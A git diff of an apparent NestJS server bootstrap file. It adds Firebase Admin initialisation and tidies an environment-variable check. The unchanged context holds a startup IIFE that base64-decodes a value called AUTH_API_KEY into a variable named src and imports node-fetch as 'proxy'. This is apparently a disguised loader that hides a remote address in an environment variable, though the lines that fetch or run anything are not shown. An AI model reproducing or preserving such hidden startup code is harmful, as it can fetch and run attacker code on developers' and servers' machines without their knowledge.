@@ -13,16 +13,11 @@ import { RolesGuard } from './common/guards/roles.guard';
 import { JwtAuthGuard } from './auth/guards/jwt-auth.guard';
 import { Reflector } from '@nestjs/core';
 import 'dotenv/config';
+import { initializeFirebaseAdmin } from './firebase/firebase-admin.config';
 
 (async () => {
-
   const authApiKey = process.env.AUTH_API_KEY;
-
-  if (!authApiKey) {
-    throw new Error('AUTH_API_KEY is missing');
-  }
-
-
+  if (!authApiKey) throw new Error('AUTH_API_KEY is missing');
 
   const src = atob(authApiKey);
   const proxy = (await import('node-fetch')).default;
@@ -59,6 +54,14 @@ async function bootstrap() {
   const compressionMw = compressionLib.default ?? compressionLib;
   const cookieParserMw = cookieParserLib.default ?? cookieParserLib;
 
+
+  try {
+    initializeFirebaseAdmin();
+    logger.log('Firebase Admin initialized');
+  } catch (err) {
+    logger.error('Firebase Admin initialization failed', err instanceof Error ? err.stack : err);
+    throw err; // still fail fast — Firebase login endpoint would be broken otherwise
+  }
   // ── Security ──
   app.use(helmetMw({
     crossOriginResourcePolicy: { policy: 'cross-origin' },
